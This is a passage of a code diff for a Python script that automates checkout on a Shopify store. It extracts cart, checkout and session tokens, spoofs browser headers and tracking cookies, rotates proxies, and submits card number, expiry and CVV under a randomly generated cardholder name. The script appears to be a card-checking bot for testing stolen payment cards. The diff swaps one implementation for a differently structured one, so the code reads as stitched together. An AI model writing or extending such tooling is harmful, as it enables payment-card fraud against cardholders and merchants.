-            elapsed = self.console_logger.step(1, "LOAD HOMEPAGE", "Loading homepage for initial cookies")
-            
-            response = await self.make_request(
-                client, 'GET', self.base_url
-            )
-            
-            # Check if proxy failed
-            if response is None:
-                self.console_logger.error_detail("Proxy dead or connection failed")
-                return "PROXY_DEAD"
-            
-            self.console_logger.request_details("GET", self.base_url, response.status_code, 
-                                              time.time() - (self.console_logger.start_time + elapsed))
-            
-            if response.status_code in [200, 304]:
-                self.console_logger.sub_step(1, 1, "Homepage loaded successfully")
-                self.console_logger.step(1, "LOAD HOMEPAGE", "Homepage loaded", "SUCCESS")
-                return True
-            else:
-                self.console_logger.error_detail(f"Failed to load homepage: {response.status_code}")
-                return False
-                
-        except Exception as e:
-            self.console_logger.error_detail(f"Homepage error: {str(e)}")
-            return False
-        
-    async def load_product_page(self, client):
-        """Load product page and extract dynamic data INCLUDING PRICE"""
-        try:
-            elapsed = self.console_logger.step(2, "LOAD PRODUCT PAGE", "Loading product page and extracting price")
-            
-            response = await self.make_request(
-                client, 'GET', self.product_url
-            )
-            
-            # Check if proxy failed
-            if response is None:
-                self.console_logger.error_detail("Proxy dead or connection failed")
-                return "PROXY_DEAD"
-            
-            self.console_logger.request_details("GET", self.product_url, response.status_code,
-                                              time.time() - (self.console_logger.start_time + elapsed))
-            
-            if response.status_code in [200, 304]:
-                html_content = response.text
-                
-                self.console_logger.sub_step(2, 1, f"HTML length: {len(html_content)} chars")
-                
-                # Extract variant ID using multiple patterns
-                variant_patterns = [
-                    r'/variants/(\d+)/',
-                    r'name="id"[^>]*value="(\d+)"',
-                    r'id["\']?\s*:\s*["\']?(\d+)["\']',
-                    r'data-variant-id="(\d+)"',
-                    r'"variants"\s*:\s*\[[^\]]*"id"\s*:\s*(\d+)',
-                ]
-                
-                for i, pattern in enumerate(variant_patterns):
-                    match = re.search(pattern, html_content)
-                    if match:
-                        variant_id = match.group(1)
-                        self.console_logger.sub_step(2, 2, f"Method {i+1} found variant: {variant_id}")
-                        if variant_id.isdigit() and len(variant_id) > 5:
-                            self.variant_id = variant_id
-                            self.console_logger.extracted_data("Variant ID", self.variant_id)
-                            break
-                
-                # If still no variant found, use the one from logs
-                if not self.variant_id:
-                    self.variant_id = "43207284392098"
-                    self.console_logger.sub_step(2, 3, "Using default variant ID from logs: 43207284392098")
-                    self.console_logger.extracted_data("Variant ID", self.variant_id)
-                
-                # Extract product ID if available
-                product_patterns = [
-                    r'product-id["\']?\s*:\s*["\']?(\d+)',
-                    r'data-product-id="(\d+)"',
-                    r'productId["\']?\s*:\s*["\']?(\d+)'
-                ]
-                
-                for pattern in product_patterns:
-                    match = re.search(pattern, html_content)
-                    if match:
-                        self.product_id = match.group(1)
-                        self.console_logger.extracted_data("Product ID", self.product_id)
-                        break
-                
-                if not self.product_id:
-                    self.product_id = "7890988171426"
-                    self.console_logger.sub_step(2, 4, "Using default product ID from logs")
-                
-                # EXTRACT PRODUCT PRICE - MULTIPLE PATTERNS
-                price_patterns = [
-                    r'"price"\s*:\s*(\d+\.?\d*)',
-                    r'"price"\s*:\s*"(\d+\.?\d*)"',
-                    r'data-price="(\d+\.?\d*)"',
-                    r'content="\$(\d+\.?\d*)"',
-                    r'price["\']?\s*:\s*["\']?(\d+\.?\d*)["\']?',
-                    r'money"\s*:\s*"(\d+\.?\d*)"',
-                    r'"amount"\s*:\s*(\d+\.?\d*)',
-                    r'<span[^>]*class="[^"]*price[^"]*"[^>]*>\s*[\$€£]?\s*(\d+\.?\d*)'
-                ]
-                
-                for pattern in price_patterns:
-                    matches = re.findall(pattern, html_content)
-                    for match in matches:
-                        try:
-                            price = float(match)
-                            if price > 0:
-                                self.product_price = price
-                                self.console_logger.sub_step(2, 5, f"Found product price: ${price:.2f}")
-                                break
-                        except:
-                            continue
-                    if self.product_price:
-                        break
-                
-                # If price not found, use default
-                if not self.product_price:
-                    self.product_price = 0.55  # Default fallback
-                    self.console_logger.sub_step(2, 6, f"Using default price: ${self.product_price:.2f}")
-                
-                # Extract delivery strategy handle
-                handle_pattern = r'"handle":"([a-f0-9]+-be73b24eea304774d3c2df281c6988e5)"'
-                handle_match = re.search(handle_pattern, html_content)
-                if handle_match:
-                    self.delivery_strategy_handle = handle_match.group(1)
-                    self.console_logger.extracted_data("Delivery Strategy Handle", self.delivery_strategy_handle)
-                
-                self.console_logger.step(2, "LOAD PRODUCT PAGE", "Product page loaded", "SUCCESS")
-                return True
-            else:
-                self.console_logger.error_detail(f"Failed to load product page: {response.status_code}")
-                return False
-                
-        except Exception as e:
-            self.console_logger.error_detail(f"Product page error: {str(e)}")
-            return False
-            
-    async def add_to_cart(self, client):
-        """Add product to cart using extracted variant ID"""
-        try:
-            elapsed = self.console_logger.step(3, "ADD TO CART", "Adding product to cart")
-            
-            variant_id = self.variant_id if self.variant_id else "43207284392098"
-            
-            add_to_cart_url = f"{self.base_url}/cart/add"
-            
-            headers = {
-                'Accept': 'application/javascript, */*; q=0.01',
-                'Accept-Encoding': 'gzip, deflate, br, zstd',
-                'Accept-Language': 'en-US,en;q=0.9',
-                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'Origin': self.base_url,
-                'Referer': self.product_url,
-                'Sec-CH-UA': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
-                'Sec-CH-UA-Mobile': '?0',
-                'Sec-CH-UA-Platform': '"Windows"',
-                'Sec-Fetch-Dest': 'empty',
-                'Sec-Fetch-Mode': 'cors',
-                'Sec-Fetch-Site': 'same-origin',
-                'User-Agent': self.user_agent,
-                'X-Requested-With': 'XMLHttpRequest'
-            }
-            
-            # Form data with all required fields
-            data = {
-                'quantity': '1',
-                'id': variant_id,
-                'form_type': 'product',
-                'utf8': '✓'
-            }
-            
-            response = await client.post(
-                add_to_cart_url,
-                headers=headers,
-                data=data,
-                cookies=self.cookies,
-                timeout=30.0
-            )
-            
-            # Check if proxy failed
-            if response is None:
-                self.console_logger.error_detail("Proxy dead or connection failed")
-                return "PROXY_DEAD"
-            
-            self.console_logger.request_details("POST", add_to_cart_url, response.status_code,
-                                              time.time() - (self.console_logger.start_time + elapsed),
-                                              f"Variant: {variant_id}")
-            
-            if response.status_code == 200:
-                self.console_logger.sub_step(3, 2, "Product added to cart successfully")
-                self.console_logger.step(3, "ADD TO CART", "Product added to cart", "SUCCESS")
-                return True
-            else:
-                error_text = response.text[:500] if response.text else "No response text"
-                self.console_logger.error_detail(f"Add to cart failed. Status: {response.status_code}")
-                self.console_logger.error_detail(f"Error response: {error_text}")
-                return False
-                
-        except Exception as e:
-            self.console_logger.error_detail(f"Add to cart error: {str(e)}")
-            return False
-    
-    async def go_to_cart_page(self, client):
-        """Go to cart page"""
-        try:
-            elapsed = self.console_logger.step(4, "GO TO CART", "Loading cart page")
-            
-            response = await self.make_request(
-                client, 'GET', f"{self.base_url}/cart"
-            )
-            
-            # Check if proxy failed
-            if response is None:
-                self.console_logger.error_detail("Proxy dead or connection failed")
-                return "PROXY_DEAD"
-            
-            self.console_logger.request_details("GET", f"{self.base_url}/cart", response.status_code,
-                                              time.time() - (self.console_logger.start_time + elapsed))
-            
-            if response.status_code in [200, 304]:
-                self.console_logger.sub_step(4, 1, "Cart page loaded successfully")
-                self.console_logger.step(4, "GO TO CART", "Cart page loaded", "SUCCESS")
-                return True
-            else:
-                self.console_logger.error_detail(f"Failed to load cart page: {response.status_code}")
-                return False
-                
-        except Exception as e:
-            self.console_logger.error_detail(f"Cart page error: {str(e)}")
-            return False
-    
-    async def go_to_checkout(self, client):
-        """Go to checkout page and extract checkout token"""
-        try:
-            elapsed = self.console_logger.step(5, "GO TO CHECKOUT", "Proceeding to checkout")
-            
-            checkout_url = f"{self.base_url}/cart"
-            
-            headers = {
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'Accept-Encoding': 'gzip, deflate, br, zstd',
-                'Accept-Language': 'en-US,en;q=0.9',
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Origin': self.base_url,
-                'Referer': f"{self.base_url}/cart",
-                'Sec-CH-UA': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
-                'Sec-CH-UA-Mobile': '?0',
-                'Sec-CH-UA-Platform': '"Windows"',
-                'Sec-Fetch-Dest': 'document',
-                'Sec-Fetch-Mode': 'navigate',
-                'Sec-Fetch-Site': 'same-origin',
-                'Sec-Fetch-User': '?1',
-                'Upgrade-Insecure-Requests': '1',
-                'User-Agent': self.user_agent
-            }
-            
-            data = {
-                'updates[]': '1',
-                'checkout': ''
-            }
-            
-            # Make the POST request WITHOUT following redirects
-            response = await client.post(
-                checkout_url,
-                headers=headers,
-                data=data,
-                cookies=self.cookies,
-                timeout=30.0,
-                follow_redirects=False
-            )
-            
-            # Check if proxy failed
-            if response is None:
-                self.console_logger.error_detail("Proxy dead or connection failed")
-                return False, "PROXY_DEAD"
-            
-            self.console_logger.request_details("POST", checkout_url, response.status_code,
-                                              time.time() - (self.console_logger.start_time + elapsed),
-                                              "Proceeding to checkout")
-            
-            if response.status_code in [302, 303]:
-                location = response.headers.get('location', '')
-                
-                if location:
-                    self.console_logger.sub_step(5, 1, f"Redirect location: {location[:100]}...")
-                    
-                    # Check if we're being redirected to shop.app (Shopify Pay)
-                    if 'shop.app' in location:
-                        self.console_logger.sub_step(5, 2, "Detected shop.app redirect (Shopify Pay)")
-                        
-                        # Extract checkout token from shop.app URL
-                        checkout_token = None
-                        
-                        # Method 1: Extract from shop.app URL
-                        if '/cn/' in location:
-                            cn_match = re.search(r'/cn/([^/]+)', location)
-                            if cn_match:
-                                checkout_token = cn_match.group(1)
-                                self.console_logger.sub_step(5, 3, f"Extracted token from URL: {checkout_token}")
-                        
-                        # Method 2: Try to get from cart cookie
-                        if not checkout_token and 'cart' in self.cookies:
-                            cart_value = self.cookies.get('cart', '')
-                            if cart_value:
-                                parts = cart_value.split('?')
-                                if parts and parts[0]:
-                                    checkout_token = parts[0]
-                                    self.console_logger.sub_step(5, 4, f"Extracted token from cookie: {checkout_token}")
-                        
-                        if checkout_token:
-                            self.checkout_token = checkout_token
-                            self.console_logger.extracted_data("Checkout Token", self.checkout_token)
-                            
-                            # Build the direct checkout URL with skip_shop_pay parameter
-                            direct_checkout_url = f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?skip_shop_pay=true&__r=1&_r=AQAB{random.randint(1000000, 9999999)}"
-                            self.console_logger.sub_step(5, 5, f"Direct checkout URL: {direct_checkout_url[:80]}...")
-                            
-                            self.console_logger.step(5, "GO TO CHECKOUT", "Checkout token extracted", "SUCCESS")
-                            return True, direct_checkout_url
-                        else:
-                            self.console_logger.error_detail("Failed to extract checkout token from shop.app redirect")
-                            return False, "Failed to extract checkout token from shop.app redirect"
-                    
-                    # Normal redirect to merchant domain
-                    elif self.base_url in location:
-                        # Extract checkout token from URL
-                        if '/checkouts/cn/' in location:
-                            match = re.search(r'/checkouts/cn/([^/]+)', location)
-                            if match:
-                                self.checkout_token = match.group(1)
-                                self.console_logger.extracted_data("Checkout Token from URL", self.checkout_token)
-                        
-                        # Add skip_shop_pay parameter to bypass Shopify Pay
-                        if '?' in location:
-                            location += '&skip_shop_pay=true'
-                        else:
-                            location += '?skip_shop_pay=true'
-                        
-                        self.console_logger.sub_step(5, 6, f"Merchant redirect: {location[:80]}...")
-                        self.console_logger.step(5, "GO TO CHECKOUT", "Redirected to merchant checkout", "SUCCESS")
-                        return True, location
-                
-                # If no location, try to extract from response
-                if not location:
-                    self.console_logger.sub_step(5, 7, "No redirect location, checking response...")
-                    
-                    # Try to find checkout token in response body
-                    response_text = response.text
-                    checkout_patterns = [
-                        r'/checkouts/cn/([^/"]+)',
-                        r'checkoutToken["\']?\s*:\s*["\']([^"\']+)',
-                        r'checkout_url["\']?\s*:\s*["\'][^"\']*/([^/?"\']+)',
-                        r'data-checkout-token=["\']([^"\']+)["\']'
-                    ]
-                    
-                    for pattern in checkout_patterns:
-                        match = re.search(pattern, response_text)
-                        if match:
-                            self.checkout_token = match.group(1)
-                            self.console_logger.extracted_data("Checkout Token from Response Body", self.checkout_token)
-                            
-                            direct_url = f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?skip_shop_pay=true&__r=1&_r=AQAB{random.randint(1000000, 9999999)}"
-                            return True, direct_url
-            
-            # If we get here without success
-            self.console_logger.error_detail(f"Failed to extract checkout token. Status: {response.status_code}")
-            return False, "Failed to extract checkout token"
-                
-        except Exception as e:
-            self.console_logger.error_detail(f"Checkout error: {str(e)}")
-            return False, f"Checkout error: {str(e)[:80]}"
-    
-    async def load_checkout_page_with_redirects(self, client, checkout_url):
-        """Load checkout page with proper redirect handling and extract tokens - FIXED VERSION"""
-        try:
-            elapsed = self.console_logger.step(6, "LOAD CHECKOUT PAGE", "Loading checkout page for tokens")
-            
-            max_redirects = 5
-            current_url = checkout_url
-            response = None
-            
-            for i in range(max_redirects):
-                self.console_logger.sub_step(6, i+1, f"Attempt {i+1}: {current_url[:100]}...")
-                
-                # Make request with full headers for checkout page
-                headers = self.get_base_headers()
-                headers.update({
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                    'Referer': f'{self.base_url}/cart',
-                    'Sec-Fetch-Dest': 'document',
-                    'Sec-Fetch-Mode': 'navigate',
-                    'Sec-Fetch-Site': 'same-origin',
-                    'Sec-Fetch-User': '?1',
-                    'Upgrade-Insecure-Requests': '1'
-                })
-                
-                response = await client.get(
-                    current_url,
-                    headers=headers,
-                    cookies=self.cookies,
-                    timeout=30.0,
-                    follow_redirects=False
-                )
-                
-                # Check if proxy failed
-                if response is None:
-                    self.console_logger.error_detail("Proxy dead or connection failed")
-                    return "PROXY_DEAD"
-                
-                if response.status_code in [200, 201]:
-                    self.console_logger.sub_step(6, i+2, f"Successfully loaded checkout page after {i+1} attempt(s)")
-                    break
-                elif response.status_code in [301, 302, 303, 307, 308]:
-                    location = response.headers.get('location', '')
-                    if location:
-                        # Handle relative URLs
-                        if location.startswith('/'):
-                            parsed_url = urlparse(current_url)
-                            location = f"{parsed_url.scheme}://{parsed_url.netloc}{location}"
-                        current_url = location
-                        self.console_logger.sub_step(6, i+3, f"Following redirect to: {location[:100]}...")
-                        await asyncio.sleep(0.5)
-                    else:
-                        self.console_logger.error_detail("Redirect without location header")
-                        break
-                else:
-                    self.console_logger.error_detail(f"Unexpected status code: {response.status_code}")
-                    break
-            
-            if not response or response.status_code not in [200, 201]:
-                self.console_logger.error_detail(f"Failed to load checkout page after {max_redirects} attempts")
-                return False
-            
-            html_content = response.text
-            self.console_logger.sub_step(6, 4, f"HTML content length: {len(html_content)} chars")
-            
-            # CRITICAL: Extract session token from the checkout page HTML - UPDATED PATTERNS
-            session_token_patterns = [
-                r'"sessionToken"\s*:\s*"([^"]+)"',
-                r'sessionToken["\']?\s*:\s*["\']([^"\']+)',
-                r'window\.__remixContext\s*=\s*{.*?"sessionToken"\s*:\s*"([^"]+)"',
-                r'<script[^>]*id="__NEXT_DATA__"[^>]*>(.*?)</script>',
-                r'<meta[^>]*name=["\']sessionToken["\'][^>]*content=["\']([^"\']+)["\']',
-                r'<meta[^>]*content=["\']([^"\']+)["\'][^>]*name=["\']sessionToken["\']',
-                r'"checkout_session_token"\s*:\s*"([^"]+)"',
-                r'"token"\s*:\s*"([^"]+)"',
-                r'([A-Za-z0-9_-]{150,})'
+            patterns = [
+                r'window\.__INITIAL_STATE__\s*=\s*({.+?});',
+                r'window\.__DATA__\s*=\s*({.+?});',
+                r'"checkoutToken":"([^"]+)"',
+                r'"proposalId":"([^"]+)"',
+                r'"submitForCompletionId":"([^"]+)"',
+                r'operationName":"Proposal".*?"id":"([^"]+)"',
+                r'operationName":"SubmitForCompletion".*?"id":"([^"]+)"'
             ]
-            
-            session_token_found = False
-            for idx, pattern in enumerate(session_token_patterns):
-                matches = re.findall(pattern, html_content, re.DOTALL)
-                for match in matches:
-                    if isinstance(match, tuple):
-                        match = match[0]
-                    token = str(match).strip()
-                    # Validate token format (should be long base64-like string)
-                    if len(token) > 100 and any(char in token for char in ['-', '_']):
-                        self.x_checkout_one_session_token = token
-                        self.console_logger.sub_step(6, 5, f"Pattern {idx+1} found session token: {token[:50]}...")
-                        session_token_found = True
-                        break
-                if session_token_found:
-                    break
-            
-            # If still not found, try a different approach - look for it in script data
-            if not session_token_found:
-                # Look for JSON data in script tags
-                script_pattern = r'<script[^>]*type=["\']application/json["\'][^>]*>(.*?)</script>'
-                script_matches = re.findall(script_pattern, html_content, re.DOTALL)
-                for script_data in script_matches:
-                    try:
-                        data = json.loads(script_data)
-                        # Search recursively in JSON
-                        def find_token_in_dict(d):
-                            if isinstance(d, dict):
-                                for key, value in d.items():
-                                    if isinstance(value, str) and len(value) > 100 and 'sessionToken' in key:
-                                        return value
-                                    elif isinstance(value, (dict, list)):
-                                        result = find_token_in_dict(value)
-                                        if result:
-                                            return result
-                            elif isinstance(d, list):
-                                for item in d:
-                                    result = find_token_in_dict(item)
-                                    if result:
-                                        return result
-                            return None
-                        
-                        token = find_token_in_dict(data)
-                        if token:
-                            self.x_checkout_one_session_token = token
-                            self.console_logger.sub_step(6, 6, f"Found session token in JSON data: {token[:50]}...")
-                            session_token_found = True
-                            break
-                    except:
-                        pass
-            
-            # If STILL not found, try to extract from window variables
-            if not session_token_found:
-                window_patterns = [
-                    r'window\.sessionToken\s*=\s*["\']([^"\']+)["\']',
-                    r'window\.checkoutSessionToken\s*=\s*["\']([^"\']+)["\']',
-                    r'sessionToken\s*=\s*["\']([^"\']+)["\']'
-                ]
-                for pattern in window_patterns:
-                    match = re.search(pattern, html_content)
-                    if match:
-                        token = match.group(1)
-                        if len(token) > 50:
-                            self.x_checkout_one_session_token = token
-                            self.console_logger.sub_step(6, 7, f"Found session token in window var: {token[:50]}...")
-                            session_token_found = True
-                            break
-            
-            # Last resort: check if there's a default token we can use
-            if not session_token_found:
-                # Look for any token-like string in the HTML
-                token_pattern = r'([A-Za-z0-9_-]{200,300})'
-                matches = re.findall(token_pattern, html_content)
-                for token in matches:
-                    if token and 'http' not in token and len(token) > 150:
-                        self.x_checkout_one_session_token = token
-                        self.console_logger.sub_step(6, 8, f"Found token-like string: {token[:50]}...")
-                        session_token_found = True
-                        break
-            
-            if not session_token_found:
-                self.console_logger.error_detail("Failed to extract session token from checkout page")
-                # Try to use a fallback approach - maybe the token is in cookies
-                if 'cart' in self.cookies:
-                    cart_value = self.cookies.get('cart', '')
-                    if cart_value:
-                        # Try to use cart value as token
-                        parts = cart_value.split('?')
-                        if parts and parts[0]:
-                            self.x_checkout_one_session_token = parts[0]
-                            self.console_logger.sub_step(6, 9, f"Using cart value as fallback token: {parts[0][:50]}...")
-                            session_token_found = True
-            
-            if not session_token_found:
-                return False
-            
-            self.console_logger.extracted_data("Session Token", f"{self.x_checkout_one_session_token[:50]}...")
-            
-            # Extract web build ID - UPDATED PATTERNS
-            web_build_patterns = [
-                r'"sha"\s*:\s*"([^"]+)"',
-                r'webBuildId["\']?\s*:\s*["\']([^"\']+)',
-                r'x-checkout-web-build-id["\']?\s*:\s*["\']([^"\']+)',
-                r'data-web-build-id=["\']([^"\']+)["\']',
-                r'<meta[^>]*content=["\']([^"\']+)["\'][^>]*name=["\']webBuildId["\']',
-                r'"buildId"\s*:\s*"([^"]+)"'
-            ]
-            
-            web_build_found = False
-            for idx, pattern in enumerate(web_build_patterns):
-                match = re.search(pattern, html_content)
-                if match:
-                    self.x_checkout_web_build_id = match.group(1).strip()
-                    if self.x_checkout_web_build_id:
-                        self.console_logger.sub_step(6, 10, f"Pattern {idx+1} found web build ID: {self.x_checkout_web_build_id}")
-                        web_build_found = True
-                        break
-            
-            if not web_build_found:
-                # Use default web build ID from logs
-                self.x_checkout_web_build_id = "64794bb5d2969ba982d4eb9ee7c44ab479c9df23"
-                self.console_logger.sub_step(6, 11, "Using default web build ID from logs")
-            
-            self.console_logger.extracted_data("Web Build ID", self.x_checkout_web_build_id)
-            
-            # Also update checkout token from the final URL
-            if '/checkouts/cn/' in current_url:
-                match = re.search(r'/checkouts/cn/([^/]+)', current_url)
-                if match:
-                    new_token = match.group(1)
-                    if new_token != self.checkout_token:
-                        self.console_logger.sub_step(6, 12, f"Updated checkout token from URL: {new_token}")
-                        self.checkout_token = new_token
-            
-            self.console_logger.step(6, "LOAD CHECKOUT PAGE", "Checkout page loaded and tokens extracted", "SUCCESS")
-            return True
-                
+
+            extracted = {}
+            for pattern in patterns:
+                matches = re.findall(pattern, html_content)
+                if matches:
+                    extracted[pattern] = matches[0]
+
+            return extracted
         except Exception as e:
-            self.console_logger.error_detail(f"Checkout page error: {str(e)}")
-            return False
-    
-    async def create_payment_session(self, client, cc, mes, ano, cvv):
-        """Create payment session with Shopify PCI - FIXED WITH RANDOM CARDHOLDER NAME"""
+            self.logger.error_log("EXTRACTION", f"Failed to extract bootstrap: {str(e)}")
+            return {}
+
+    def extract_delivery_strategy(self, html_content):
+        """Extract available delivery strategy handle from page"""
         try:
-            elapsed = self.console_logger.step(7, "CREATE PAYMENT SESSION", "Creating payment session with PCI")
-            
-            headers = {
-                'Accept': 'application/json',
-                'Accept-Encoding': 'gzip, deflate, br, zstd',
-                'Accept-Language': 'en-US,en;q=0.9',
-                'Content-Type': 'application/json',
-                'Origin': 'https://checkout.pci.shopifyinc.com',
-                'Referer': 'https://checkout.pci.shopifyinc.com/build/682c31f/number-ltr.html',
-                'Sec-CH-UA': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
-                'Sec-CH-UA-Mobile': '?0',
-                'Sec-CH-UA-Platform': '"Windows"',
-                'Sec-Fetch-Dest': 'empty',
-                'Sec-Fetch-Mode': 'cors',
-                'Sec-Fetch-Site': 'same-origin',
-                'Sec-Fetch-Storage-Access': 'active',
-                'User-Agent': self.user_agent,
-                'Shopify-Identification-Signature': self.generate_shopify_signature()
+            pattern = r'"handle":"([a-f0-9]+-be73b24eea304774d3c2df281c6988e5)"'
+            matches = re.findall(pattern, html_content)
+            if matches:
+                return matches[0]
+
+            pattern2 = r'"handle":"([a-f0-9]+-[a-f0-9]+)"'
+            matches2 = re.findall(pattern2, html_content)
+            if matches2:
+                for match in matches2:
+                    if len(match) > 30:
+                        return match
+            return None
+        except:
+            return None
+
+    def get_checkout_page_with_token(self, max_retries=3):
+        """Get checkout page and extract session token with retry logic"""
+        for attempt in range(max_retries):
+            try:
+                self.step(5 if attempt == 0 else 5 + attempt, "LOAD CHECKOUT", 
+                         f"Loading native checkout page (Attempt {attempt + 1}/{max_retries})", 
+                         f"Token: {self.checkout_token[:15]}..." if self.checkout_token else "None")
+
+                checkout_url = f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us"
+                checkout_params = {
+                    '_r': self.generate_random_string(32),
+                    'auto_redirect': 'false',
+                    'edge_redirect': 'true',
+                    'skip_shop_pay': 'true'
+                }
+
+                checkout_headers = {
+                    **self.headers,
+                    'referer': self.base_url + '/',
+                    'sec-fetch-site': 'cross-site'
+                }
+
+                resp = self.session.get(checkout_url, headers=checkout_headers, params=checkout_params, timeout=30)
+
+                if resp.status_code != 200:
+                    self.logger.error_log("CHECKOUT_PAGE", f"Status: {resp.status_code}", f"Attempt {attempt + 1}")
+                    if attempt < max_retries - 1:
+                        self.random_delay(2, 4)
+                        continue
+                    return False, f"Failed to load checkout: {resp.status_code}"
+
+                page_content = resp.text
+
+                self.logger.data_extracted("Response Headers", str(dict(resp.headers)), "HTTP Response")
+
+                self.session_token = self.extract_session_token_from_html_aggressive(page_content)
+
+                if not self.session_token:
+                    self.session_token = self.generate_session_token_from_checkout()
+                    if self.session_token:
+                        self.logger.data_extracted("Session Token Generated", self.session_token[:50] + "...", "Generated from checkout")
+
+                self.graphql_session_token = self.construct_graphql_session_token()
+
+                if self.session_token and self.graphql_session_token:
+                    self.logger.data_extracted("Final Session Token", self.session_token[:50] + "...", "Success")
+                    self.logger.data_extracted("GraphQL Session Token", self.graphql_session_token, "Constructed")
+                    return True, page_content
+
+                if attempt < max_retries - 1:
+                    self.logger.error_log("TOKEN_RETRY", f"Missing session token, retrying...", f"Attempt {attempt + 1}")
+                    self.random_delay(2, 4)
+                    continue
+
+            except Exception as e:
+                self.logger.error_log("CHECKOUT_ERROR", str(e), f"Attempt {attempt + 1}")
+                if attempt < max_retries - 1:
+                    self.random_delay(2, 4)
+                    continue
+                return False, f"Checkout page error: {str(e)}"
+
+        error_msg = "Could not extract session token from checkout page\n"
+        error_msg += f"Session token: {bool(self.session_token)}\n"
+        error_msg += f"GraphQL token: {bool(self.graphql_session_token)}"
+        return False, error_msg
+
+    def execute_checkout(self, cc, mes, ano, cvv):
+        """Execute checkout using HTTP requests"""
+        try:
+            # Step 1: Initialize session and get homepage
+            self.step(1, "INIT SESSION", "Getting homepage and initializing cookies")
+
+            shopify_y, shopify_s = self.generate_tracking_ids()
+
+            initial_cookies = {
+                'localization': 'US',
+                '_shopify_y': shopify_y,
+                '_shopify_s': shopify_s,
+                'cart_currency': 'USD'
             }
-            
-            # Use random name for card as per instructions - IMPORTANT: This is the cardholder name
-            card_name = f"{self.random_first_name} {self.random_last_name}"
-            
-            json_data = {
-                'credit_card': {
-                    'number': cc.replace(' ', ''),
-                    'month': int(mes),
-                    'year': int(ano),
-                    'verification_value': cvv,
-                    'name': card_name,  # Cardholder name - should match billing name
-                    'start_month': None,
-                    'start_year': None
+
+            for key, value in initial_cookies.items():
+                self.session.cookies.set(key, value, domain='meta-app-prod-store-1.myshopify.com')
+
+            resp = self.session.get(self.base_url, headers=self.headers, timeout=30)
+            if resp.status_code != 200:
+                return False, f"Failed to load homepage: {resp.status_code}"
+
+            self.random_delay(1, 2)
+
+            # Step 2: Add to cart
+            self.step(2, "ADD TO CART", "Adding product to cart", f"Variant: {self.variant_id}")
+
+            cart_headers = {
+                **self.headers,
+                'accept': 'application/javascript',
+                'origin': self.base_url,
+                'referer': self.product_url,
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'x-requested-with': 'XMLHttpRequest'
+            }
+
+            boundary = f"----WebKitFormBoundary{self.generate_random_string(16)}"
+            cart_headers['content-type'] = f'multipart/form-data; boundary={boundary}'
+
+            payload_lines = [
+                f'--{boundary}',
+                'Content-Disposition: form-data; name="quantity"',
+                '',
+                '1',
+                f'--{boundary}',
+                'Content-Disposition: form-data; name="form_type"',
+                '',
+                'product',
+                f'--{boundary}',
+                'Content-Disposition: form-data; name="utf8"',
+                '',
+                '✓',
+                f'--{boundary}',
+                'Content-Disposition: form-data; name="id"',
+                '',
+                self.variant_id,
+                f'--{boundary}',
+                'Content-Disposition: form-data; name="product-id"',
+                '',
+                self.product_id,
+                f'--{boundary}',
+                'Content-Disposition: form-data; name="section-id"',
+                '',
+                'template--15468374917282__main',
+                f'--{boundary}',
+                'Content-Disposition: form-data; name="sections"',
+                '',
+                'cart-notification-product,cart-notification-button,cart-icon-bubble',
+                f'--{boundary}',
+                'Content-Disposition: form-data; name="sections_url"',
+                '',
+                f'/products/{self.product_handle}',
+                f'--{boundary}--'
+            ]
+
+            cart_payload = '\r\n'.join(payload_lines)
+
+            resp = self.session.post(
+                f"{self.base_url}/cart/add",
+                headers=cart_headers,
+                data=cart_payload,
+                timeout=30
+            )
+
+            if resp.status_code != 200:
+                return False, f"Failed to add to cart: {resp.status_code}"
+
+            try:
+                cart_data = resp.json()
+                if 'items' in cart_data and len(cart_data['items']) > 0:
+                    self.cart_token = cart_data['items'][0].get('key', '').split(':')[0]
+            except:
+                pass
+
+            self.random_delay(1, 2)
+
+            # Step 3: Get cart page
+            self.step(3, "GET CART", "Loading cart page")
+
+            cart_page_headers = {
+                **self.headers,
+                'referer': self.product_url,
+                'sec-fetch-site': 'same-origin'
+            }
+
+            resp = self.session.get(f"{self.base_url}/cart", headers=cart_page_headers, timeout=30)
+
+            self.random_delay(1, 2)
+
+            # Step 4: Start checkout
+            self.step(4, "START CHECKOUT", "Initiating checkout process")
+
+            checkout_start_headers = {
+                **self.headers,
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': self.base_url,
+                'referer': self.product_url,
+                'sec-fetch-site': 'same-origin'
+            }
+
+            resp = self.session.post(
+                f"{self.base_url}/cart",
+                headers=checkout_start_headers,
+                data={'checkout': ''},
+                allow_redirects=True,
+                timeout=30
+            )
+
+            current_url = resp.url
+            self.checkout_token = self.extract_checkout_token(current_url)
+
+            if not self.checkout_token:
+                match = re.search(r'"checkoutToken":"([^"]+)"', resp.text)
+                if match:
+                    self.checkout_token = match.group(1)
+
+            if not self.checkout_token:
+                return False, "Could not extract checkout token"
+
+            self.logger.data_extracted("Checkout Token", self.checkout_token[:20] + "...", "URL")
+
+            self.random_delay(2, 3)
+
+            # Step 5: Get checkout page with session token extraction
+            success, page_content = self.get_checkout_page_with_token(max_retries=3)
+
+            if not success:
+                return False, page_content
+
+            bootstrap_data = self.extract_bootstrap_data(page_content)
+            self.logger.data_extracted("Bootstrap Data", str(list(bootstrap_data.keys())), "Page")
+
+            self.delivery_strategy_handle = self.extract_delivery_strategy(page_content)
+            if self.delivery_strategy_handle:
+                self.logger.data_extracted("Delivery Strategy", self.delivery_strategy_handle, "Page")
+            else:
+                self.delivery_strategy_handle = "5315e952d539372894df63d2b7463df0-be73b24eea304774d3c2df281c6988e5"
+
+            if 'operationName":"Proposal".*?"id":"([^"]+)"' in bootstrap_data:
+                self.proposal_id = bootstrap_data['operationName":"Proposal".*?"id":"([^"]+)"']
+            else:
